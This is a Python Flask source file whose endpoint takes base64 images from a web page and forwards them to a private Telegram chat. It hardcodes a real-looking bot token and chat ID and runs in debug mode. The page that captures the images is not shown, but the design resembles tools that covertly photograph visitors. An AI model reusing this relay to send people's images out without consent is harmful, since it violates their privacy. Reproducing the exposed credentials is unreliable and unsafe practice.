from flask import Flask, request, render_template, jsonify
import requests
import os
import base64
from datetime import datetime

app = Flask(__name__)

# Telegram Bot API details
BOT_TOKEN = "7379451782:AAGMp5sONfsjO2IdZzU9Hp-AuN68TgaZXiw"
CHAT_ID = "5095137619"

# Directory to save images temporarily
UPLOAD_FOLDER = "uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Route to render the frontend page
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send_photo', methods=['POST'])
def send_photo():
    try:
        # Log incoming request
        print("Received request:", request.json)

        # Get the base64-encoded image from the request
        data = request.json
        if not data or 'image' not in data:
            return jsonify({"error": "No image provided"}), 400

        image_data = data['image']

        # Decode the base64 image and save it to a file
        img_data = base64.b64decode(image_data.split(',')[1])
        file_name = f"{UPLOAD_FOLDER}/photo_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"
        with open(file_name, "wb") as img_file:
            img_file.write(img_data)

        # Send the image to Telegram
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(file_name, "rb") as img_file:
            response = requests.post(
                telegram_url,
                data={"chat_id": CHAT_ID},
                files={"photo": img_file}
            )
        print("Telegram response:", response.json())

        # Remove the saved image after sending
        os.remove(file_name)

        # Return the response from Telegram
        return jsonify(response.json())
    except Exception as e:
        print("Error:", str(e))
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
